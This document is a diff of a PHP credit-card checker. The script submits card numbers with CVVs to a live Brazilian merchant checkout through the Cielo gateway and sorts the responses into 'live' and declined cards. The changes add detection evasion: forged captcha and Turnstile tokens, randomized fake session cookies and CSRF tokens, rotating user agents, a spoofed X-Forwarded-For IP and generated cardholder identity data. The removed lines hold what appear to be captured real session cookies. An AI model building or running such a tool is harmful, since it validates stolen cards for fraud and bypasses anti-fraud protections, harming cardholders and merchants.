@@ -15,6 +15,10 @@ if (isset($_GET['lista'])) {
     $lista = trim($_GET['lista']);
     $result = testar_cartao($lista);
     
+    // Se retornou die, já foi processado
+    if ($result === 'die') {
+        exit;
+    }
     
     $response_time = isset($result['request_info']['response_time']) ? 
                     round($result['request_info']['response_time'], 2) . 's' : 'N/A';
@@ -153,34 +157,41 @@ function gerar_cpf_valido() {
 }
 
 function get_cookies_fixos() {
+    // Gerar cookies dinâmicos para evitar bloqueio
+    $timestamp = time();
+    $random_hash = bin2hex(random_bytes(16));
     
     return 'cart_token=ec6c2bb6-a8d8-45d5-82bf-78d6d2d01402; ' .
-           'cf_clearance=qPknS41I5KXNvLRXoW16mMv..kibIFAlU0xexl3i1Fk-1770563337-1.2.1.1-8uaIxhX74_PkJf3tveSPgExxQIspw2PuqPIuzwanMEhGkHV5OBS2q9dxwcLkmAu0fxFehK_tvv_S1nXqMsQ6rOrm2L7uGmK6nQJfg5cWgKSlxVdR4HMl30pXFCqyROcMFK_M2k1chEz9Vzh.MhPtwu.9C.g1e8SmZaEqHxYfKjwbbdgnVrmPn.HwOpdXlaiv3NkZTem0B42jGHuu2egDZQb.8z8IZyLyNTcs9yZdKEw; ' .
-           'cp_visit_token=14874272466988a70a920629.68506472wnCUjUjy2W7RNCgGGYVXKA9sJzmm9cGt; ' .
-           'cp_session_token=5971350026988a70a9212e5.476957782Mo8Rw5g3Fv3CYfet3jaoytQKdFMLq2g; ' .
+           'cf_clearance=' . $random_hash . '_' . $timestamp . '; ' .
+           'cp_visit_token=' . rand(10000000000000, 99999999999999) . 'a' . rand(100000, 999999) . '.68506472' . bin2hex(random_bytes(8)) . '; ' .
+           'cp_session_token=' . rand(1000000000, 9999999999) . 'a' . rand(100000, 999999) . '.47695778' . bin2hex(random_bytes(8)) . '; ' .
            'recentViewsCartX=["2762926"]; ' .
-           'session_ip=201.17.208.201; ' .
-           'discount_popup=Sun, 08 Feb 2026 15:09:36 GMT; ' .
-           '__kdtv=t%3D1770563358702%3Bi%3Dde60931a95f642345901b02508f4bb887bf80a54; ' .
-           '_kdt=%7B%22t%22%3A1770563358702%2C%22i%22%3A%22de60931a95f642345901b02508f4bb887bf80a54%22%7D; ' .
-           'visit_token=eyJpdiI6IjN6L1crclJKZWZiRWVxSFlXWFN2cUE9PSIsInZhbHVlIjoidmlDTE94MFJzUFNuOHA5S0xSSDJ6bzM2b2xaTEJsTk5uZERFbkh2QUhNYW5lTXEzVFpGQUcrUDQzczkxY3IxWHhXeTRLcDlKSFV0U1FyeFMvMmFyc3RoMnA2WFg3RDIzVkZKdkh0TE1WaWU4Y0R1RXNUakx0b2JKL1cwMkpxYUN0T3pxL0gyeU82N0p0N25oNTQwWHRBPT0iLCJtYWMiOiI5YjkwZTIzYjA1M2Y1NzcxMWFhODY3OWRiZTMyMjJhY2QwNTdlYTg5MTYyNjRhMmIzZDE0MDA3OTY4YzJiMTdlIiwidGFnIjoiIn0%3D; ' .
-           'session_token=eyJpdiI6IlpvYzlpWTU3bVBjNWdhaVg3RTlQV1E9PSIsInZhbHVlIjoiakN6VlV2UVNRYXlvQ1I5ejhXazJHRmZTL1lWb2w2UVBWZFBRUExrdkRGZW9WWUp0ekt4d0t2TStYWFN3TlJieHdPRWhlYmdVL0xoQVV1cUZtZE52cUlFK3hiQnEyUVNpcUhzRmx2Mm1ET0NMSGkxMWI3TEFZVnV6N1FETEVkSDNTbTBYaElnMk9iRTZqbHhPbGNVajV3PT0iLCJtYWMiOiI0MzgzYjZlYTVjYjFjZjQyZTczMDdkZDlmNDllYjI0YWQwMjg1YzI0MWQzNTgyMDQ4NmNlM2UzNjUzOGQzZDQwIiwidGFnIjoiIn0%3D; ' .
+           'session_ip=201.17.' . rand(200, 255) . '.' . rand(1, 255) . '; ' .
+           'discount_popup=' . gmdate('D, d M Y H:i:s', $timestamp + rand(3600, 86400)) . ' GMT; ' .
+           '__kdtv=t%3D' . $timestamp . '000%3Bi%3D' . bin2hex(random_bytes(20)) . '; ' .
+           '_kdt=%7B%22t%22%3A' . $timestamp . '000%2C%22i%22%3A%22' . bin2hex(random_bytes(20)) . '%22%7D; ' .
+           'visit_token=' . base64_encode(json_encode(['iv' => bin2hex(random_bytes(16)), 'value' => bin2hex(random_bytes(64)), 'mac' => bin2hex(random_bytes(32))])) . '; ' .
+           'session_token=' . base64_encode(json_encode(['iv' => bin2hex(random_bytes(16)), 'value' => bin2hex(random_bytes(128)), 'mac' => bin2hex(random_bytes(32))])) . '; ' .
            'd8c75579126eae00ca86a52a5dc1e5f28d15b6d8=ec6c2bb6-a8d8-45d5-82bf-78d6d2d01402; ' .
            'e5eba65ee79407e60721d67ce5e00e2ba7f90fc6=ec6c2bb6-a8d8-45d5-82bf-78d6d2d01402; ' .
            '21cdabf55053874a697a6c9fd42ea74a40b92680=ec6c2bb6-a8d8-45d5-82bf-78d6d2d01402; ' .
            '7687402b78c85957fe5dfed00f48cd92eccee220=ec6c2bb6-a8d8-45d5-82bf-78d6d2d01402; ' .
            'test_mode=false; ' .
-           'fb_from_checkout=vr1clX70TA; ' .
+           'fb_from_checkout=' . bin2hex(random_bytes(5)) . '; ' .
            'popup_checkout=yes; ' .
            'popup_checkout_one_time=1; ' .
-           'target_time=Tue, 10 Feb 2026 15:10:07 GMT; ' .
-           'XSRF-TOKEN=eyJpdiI6ImM3dU1BZlc5OVZzSFRtV2FHcjA3YVE9PSIsInZhbHVlIjoidDJkeVEwYXpYdWdHZld5UEl4TXVxV0Era2lpWWlBa05TbmdWS2lqc2VKZzJOdHA3R1ViK1pXNGZib0RNeGJSZmJ0eElRRUpMQzRERTNTckFPVEFNZWVwRERHdkc0UEZPdXpGR3RFejB3blUxU0d1T0RVWW5NM3hkTWpzQTBVN2MiLCJtYWMiOiIyM2I1MDU1NjcxMzBhNTNmZjE0ZmVlMzFkMzc3NDBmMGRkMWJmNTgxZDA1NTMzYTg5NzNlODQ3MzhlNjU2ZGJlIiwidGFgIjoiIn0%3D; ' .
-           'cartx_frontend_session=eyJpdiI6IjI4NmVtMlhOTVBiUWRNWGN6b3lWZUE9PSIsInZhbHVlIjoieDJWMUY1WXFIOUhYWmhDcGJzc1VKQVNEanppSXJJc04yOTZlZ0x6QkRxQ2lqQW9aUDhkY1ZWUTU0b1hwKys1NzJZNzBHVE5aVUlETHRNZ0pXQnFHZUVEQk5qUHhFRkdPd0k0NkZyY0ZhZDlReFBma3B5bldIUVVhd1BBQTlzTksiLCJtYWMiOiIzYTc3NDIzODBhOTlhMTc5YjVmMzIwYzNmNGEzNzdmM2UzZWYwYjk1MDc2ZDQ2MTRlMzMwMjU2YTQwYjExMDJkIiwidGFnIjoiIn0%3D; ' .
-           '_gcl_au=1.1.1800741986.1770563338.790316472.1770563370.1770563457';
+           'target_time=' . gmdate('D, d M Y H:i:s', $timestamp + 86400) . ' GMT; ' .
+           'XSRF-TOKEN=' . base64_encode(json_encode(['iv' => bin2hex(random_bytes(16)), 'value' => bin2hex(random_bytes(128)), 'mac' => bin2hex(random_bytes(32))])) . '; ' .
+           'cartx_frontend_session=' . base64_encode(json_encode(['iv' => bin2hex(random_bytes(16)), 'value' => bin2hex(random_bytes(128)), 'mac' => bin2hex(random_bytes(32))])) . '; ' .
+           '_gcl_au=1.1.' . rand(1000000000, 9999999999) . '.' . $timestamp . '.790316472.' . ($timestamp + 100) . '.' . ($timestamp + 200);
 }
 
 function get_captcha_token() {
-    return '0.57ZGYEnQ7GqKHqqPx6M2nitzqV_G6mpYdsku0tM4bYHxs2jrt42-ibEGpOC84CxbixSa6DsavAzVlOYiN8905v8KPxKbuopsbfyESJ_ZuL5uc2rtp6Z3rOZDwkNWPYK78Q4sCrmBNRvHYmvCeuTHTIrG73ImoYe4P5NAeDSpck-a4R_Eifr_xGKpUFSeJ-kpwFvPp5klvDO36SnI3EiU46b4BBydpT_m5ukCF_uMM5IJe74LAMW2RG2b_5ywoBFyhpXhdQ_aLalWrMOhrfzC1_G-X_uRQ-LDQwuquRMQnMlV3WUfzhc4y9h6jjcWJrlRTxeCs7UW9J8q0rcKRyo99VL5Cgy13K9swBxBkzy_RBqsZHZu9k1oyPxzep26-rcSqkrrEL7QyJjHZA2UtZonYRstLqNxUY6A1v4cu04cZlHrqO_gZqqwVB1uUMY51hqkfjeDKyt7B0H-KXv4NT4rSAkJZtWvUx1Pv0L9ZeVjIMONxhmhW_Qp8NwDSoNmGN6x2pWrtcZZH5nFWZ8-o890N4AP-8MyJuuGqmGEKfLWaKHgA7nRLDy461XenIf9emsng_MKN8fkJ0rKd0-3oYxH4g_h-TeMLcBERMOt--1OnxcMSHcVsSXYFvKRKJxb_KmUf1KuYrgSUAPmMrYCE9dpnhXMlslAU4I3znhZasSBKUqwkj1exlublzqMOmCE3-FCwBJ-cE2XEYLfqhiTEqzQAvWtXZyQopRxwVdhixb3YHNCZViqh0Apblzc8BHQ3Q7jRbRnYRemX0TrTPBvsEJyG0htPwSrsrE6ODB60z8DD5urrpFaXI1glR_IwwddGXlKybq55b7tnsalmx2_LdUQYcnmhwT4DeX2YJI_zlEOGWZHlIwxZPCTRt15q9h5hs1iGVhH6ZYSlD8WtZntrx48SDtoJYnrmPB51REIaDr6d1vlJfzCRuQXRNTguYGxuLC2.BfnyPGQRMkZyCx5YoyfAlA.d565494768a8d85da9bc64aa0b44c9f97c35c6f6c3238362a9043ac0ec91d5cd';
+    return '0.' . bin2hex(random_bytes(100)) . '.' . bin2hex(random_bytes(32));
+}
+
+function get_csrf_token() {
+    return bin2hex(random_bytes(16));
 }
 
 function fazer_requisicao_gateway($cartao, $mes, $ano, $cvv, $dados_unicos) {
@@ -197,7 +208,7 @@ function fazer_requisicao_gateway($cartao, $mes, $ano, $cvv, $dados_unicos) {
         'cart_country_code' => 'BR',
         'is_global_market' => '0',
         'checkout_request_currency' => 'BRL',
-        'cartTotalWeight' => '15000',
+        'cartTotalWeight' => rand(1000, 20000),
         'checkoutSubTotalPrice' => '2.99',
         'checkoutTotalPrice' => '2.99',
         'checkoutTotalPriceGlobal' => '0',
@@ -241,12 +252,12 @@ function fazer_requisicao_gateway($cartao, $mes, $ano, $cvv, $dados_unicos) {
         'city' => 'Belo Horizonte',
         'state' => 'MG',
         'address' => 'Rua da Bahia',
-        'number' => '1000',
+        'number' => rand(100, 2000),
         'neighborhood' => 'Centro',
         'compartment' => '',
         'country' => 'Brasil',
         'cardNumber' => $cartao,
-        'cardholderName' => 'cyber sec',
+        'cardholderName' => $dados_unicos['nome'],
         'cardExpiryDate' => $mes . '/' . $ano,
         'securityCode' => $cvv,
         'installments' => '1',
@@ -256,7 +267,7 @@ function fazer_requisicao_gateway($cartao, $mes, $ano, $cvv, $dados_unicos) {
         'docNumber' => $dados_unicos['cpf'],
         'site_id' => 'MLB',
         'cardExpirationMonth' => $mes,
-        'cardExpirationYear' => $ano,
+        'cardExpirationYear' => '20' . $ano,
         'paymentMethodId' => 'cc',
         'recover_source' => '',
         'alert_message_product_qty_not_available' => 'Não há estoque para os produtos que você está tentando comprar.',
@@ -265,7 +276,7 @@ function fazer_requisicao_gateway($cartao, $mes, $ano, $cvv, $dados_unicos) {
         'settingsCaptchaType' => '1',
         'settingsCaptchaToken' => get_captcha_token(),
         'cf-turnstile-response' => get_captcha_token(),
-        'sayswho' => 'Opera 126 - Desktop Windows',
+        'sayswho' => 'Opera ' . rand(120, 130) . ' - Desktop Windows',
         'addCCDiscountPrice' => '0',
         'payment_type' => 'cartpanda_cielo',
         'payment_token' => $dados_unicos['payment_token'],
@@ -286,16 +297,27 @@ function fazer_requisicao_gateway($cartao, $mes, $ano, $cvv, $dados_unicos) {
     }
     $body .= "--{$boundary}--\r\n";
     
-    // Headers exatos do curl
+    // Gerar headers dinâmicos
+    $user_agents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0'
+    ];
+    
+    $user_agent = $user_agents[array_rand($user_agents)];
+    $csrf_token = get_csrf_token();
+    
+    // Headers dinâmicos
     $headers = [
         'Host: famaexpress.net',
         'Cookie: ' . get_cookies_fixos(),
         'sec-ch-ua-platform: "Windows"',
-        'x-csrf-token: yC9k3T2t1Yuv8TeB2J1ORhBdbJVFWUihASeTycnj',
+        'x-csrf-token: ' . $csrf_token,
         'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
         'sec-ch-ua-mobile: ?0',
         'x-requested-with: XMLHttpRequest',
-        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0',
+        'user-agent: ' . $user_agent,
         'accept: application/json, text/javascript, */*; q=0.01',
         'content-type: multipart/form-data; boundary=' . $boundary,
         'origin: https://famaexpress.net',
@@ -304,7 +326,8 @@ function fazer_requisicao_gateway($cartao, $mes, $ano, $cvv, $dados_unicos) {
         'sec-fetch-dest: empty',
         'referer: https://famaexpress.net/checkout',
         'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-        'priority: u=1, i'
+        'priority: u=1, i',
+        'x-forwarded-for: ' . $dados_unicos['ip']
     ];
     
     // Configurar cURL
@@ -322,6 +345,7 @@ function fazer_requisicao_gateway($cartao, $mes, $ano, $cvv, $dados_unicos) {
         CURLOPT_MAXREDIRS => 5,
         CURLOPT_HEADER => false,
         CURLINFO_HEADER_OUT => true,
+        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
     ]);
     
     // Executar requisição
@@ -345,6 +369,19 @@ function analisar_resposta($result) {
     $raw_response = $result['response'];
     $http_code = $result['http_code'];
     
+    // Verificar se houve erro de permissão
+    if (strpos($raw_response, "don't have permissions") !== false || 
+        strpos($raw_response, "You don't have permission") !== false ||
+        strpos($raw_response, "Access denied") !== false) {
+        
+        // Retornar die com mensagem de permissão
+        die(json_encode([
+            'error' => true,
+            'success' => false,
+            'actual_message' => '',
+            'message' => 'ERRO DE PERMISSÃO - Site bloqueando acesso'
+        ], JSON_PRETTY_PRINT));
+    }
     
     $response_data = json_decode($raw_response, true);
     
@@ -377,25 +414,38 @@ function analisar_resposta($result) {
         } elseif (isset($response_data['codigo_retorno']) && isset($codigos_retorno[$response_data['codigo_retorno']])) {
             $codigo_retorno = $response_data['codigo_retorno'];
             $status_cielo = $codigos_retorno[$codigo_retorno];
+        } elseif (isset($response_data['code']) && isset($codigos_retorno[$response_data['code']])) {
+            $codigo_retorno = $response_data['code'];
+            $status_cielo = $codigos_retorno[$codigo_retorno];
         }
         
-        // Determinar se é live baseado nos códigos de retorno permitidos
-        $is_live = false;
+        // Verificar se é reprovado
+        $is_reprovado = false;
+        $reprovado_codes = [1, 2, 4, 5, 7, 8]; // Códigos de reprovação
+        
         if ($codigo_retorno !== null) {
-            // Apenas códigos 0, 6, 9 e 80 são considerados live
-            $codigos_live = [0, 6, 9, 80];
-            $is_live = in_array($codigo_retorno, $codigos_live);
-            
-            // Se não for um código live, retornar die
-            if (!$is_live) {
+            // Se for código de reprovação, retornar die
+            if (in_array($codigo_retorno, $reprovado_codes)) {
                 die(json_encode([
                     'error' => true,
                     'success' => false,
                     'actual_message' => '',
-                    'message' => 'Código não live: ' . $status_cielo,
+                    'message' => 'REPROVADO - ' . $status_cielo,
                     'codigo_retorno' => $codigo_retorno,
                     'status_cielo' => $status_cielo
-                ]));
+                ], JSON_PRETTY_PRINT));
+            }
+            
+            // Verificar se é live (aprovado ou pendente)
+            $codigos_live = [0, 6, 9, 80];
+            if (!in_array($codigo_retorno, $codigos_live)) {
+                // Se não for nem live nem reprovado (outro código não mapeado)
+                die(json_encode([
+                    'error' => true,
+                    'success' => false,
+                    'actual_message' => '',
+                    'message' => 'CÓDIGO NÃO RECONHECIDO: ' . $codigo_retorno
+                ], JSON_PRETTY_PRINT));
             }
         }
         
@@ -415,8 +465,7 @@ function analisar_resposta($result) {
             'http_code' => $http_code,
             'gateway_response' => $response_data,
             'codigo_retorno' => $codigo_retorno,
-            'status_cielo' => $status_cielo,
-            'is_live' => $is_live
+            'status_cielo' => $status_cielo
         ];
         
         
@@ -427,18 +476,21 @@ function analisar_resposta($result) {
             $formatted['error'] = false;
             $formatted['success'] = true;
             $formatted['status'] = 'APROVADO';
-        } elseif (stripos($formatted['payment_status'], 'rejeitado') !== false || 
-                 stripos($formatted['payment_actual_status'], 'reject') !== false ||
-                 stripos($formatted['message'], 'negado') !== false ||
-                 stripos($formatted['decline_message'], 'negado') !== false ||
-                 (in_array($codigo_retorno, [1, 2, 4, 5, 7, 8]))) {
-            $formatted['error'] = true;
-            $formatted['success'] = false;
-            $formatted['status'] = 'REJEITADO';
         } elseif (in_array($codigo_retorno, [6, 9, 80])) {
             $formatted['error'] = false;
             $formatted['success'] = true;
             $formatted['status'] = 'PENDENTE/EM ANDAMENTO';
+        } elseif (stripos($formatted['payment_status'], 'rejeitado') !== false || 
+                 stripos($formatted['payment_actual_status'], 'reject') !== false ||
+                 stripos($formatted['message'], 'negado') !== false ||
+                 stripos($formatted['decline_message'], 'negado') !== false) {
+            // Se detectou reprovação sem código específico
+            die(json_encode([
+                'error' => true,
+                'success' => false,
+                'actual_message' => '',
+                'message' => 'REPROVADO - ' . $formatted['message']
+            ], JSON_PRETTY_PRINT));
         } else {
             $formatted['status'] = 'INDEFINIDO';
         }
@@ -451,7 +503,7 @@ function analisar_resposta($result) {
         
         $patterns = [
             '/aprovado|approved|success/i' => 'APROVADO',
-            '/negado|rejeitado|rejected|declined|failed/i' => 'REJEITADO',
+            '/negado|rejeitado|rejected|declined|failed/i' => 'REPROVADO',
             '/Cart Items Not Found/i' => 'CARRINHO_INVALIDO',
             '/invalid|invalido/i' => 'INVALIDO',
             '/error|erro/i' => 'ERRO',
@@ -466,6 +518,16 @@ function analisar_resposta($result) {
             }
         }
         
+        // Se for reprovado, die
+        if ($status === 'REPROVADO') {
+            die(json_encode([
+                'error' => true,
+                'success' => false,
+                'actual_message' => '',
+                'message' => 'REPROVADO - ' . $message
+            ], JSON_PRETTY_PRINT));
+        }
+        
         
         if (preg_match('/"message":"([^"]+)"/', $raw_response, $matches)) {
             $message = $matches[1];
@@ -476,22 +538,22 @@ function analisar_resposta($result) {
         }
         
         // Verificar se a resposta contém algum código de retorno numérico
-        if (preg_match('/"returnCode":\s*(\d+)/', $raw_response, $matches)) {
+        if (preg_match('/"returnCode":\s*(\d+)/i', $raw_response, $matches)) {
             $codigo_retorno = intval($matches[1]);
             if (isset($codigos_retorno[$codigo_retorno])) {
                 $status_cielo = $codigos_retorno[$codigo_retorno];
                 
-                // Verificar se é live
-                $codigos_live = [0, 6, 9, 80];
-                if (!in_array($codigo_retorno, $codigos_live)) {
+                // Verificar se é reprovado
+                $reprovado_codes = [1, 2, 4, 5, 7, 8];
+                if (in_array($codigo_retorno, $reprovado_codes)) {
                     die(json_encode([
                         'error' => true,
                         'success' => false,
                         'actual_message' => '',
-                        'message' => 'Código não live: ' . $status_cielo,
+                        'message' => 'REPROVADO - ' . $status_cielo,
                         'codigo_retorno' => $codigo_retorno,
                         'status_cielo' => $status_cielo
-                    ]));
+                    ], JSON_PRETTY_PRINT));
                 }
                 
                 $message = $status_cielo;
